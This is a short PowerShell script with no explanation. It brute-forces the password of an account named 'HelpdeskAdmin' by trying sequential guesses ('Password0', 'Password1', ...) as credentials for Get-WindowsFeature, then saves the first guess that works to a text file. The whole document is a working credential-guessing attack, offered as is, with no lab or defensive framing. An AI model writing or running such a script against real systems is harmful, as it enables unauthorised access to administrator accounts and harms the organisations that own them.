$ErrorActionPreference = "Stop"

$Username = "HelpdeskAdmin"
$i = 0
$PasswordCracked = $false

while (-not $PasswordCracked) {
    $Password = "Password$($i)"
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)
    
    try {
        Get-WindowsFeature -Credential $Credential
        $Password | Out-File -FilePath "C:\Scripts\Password.txt" -Force
        $PasswordCracked = $true
    } catch {
        Start-Sleep -Seconds 1
        $i++
    }
}
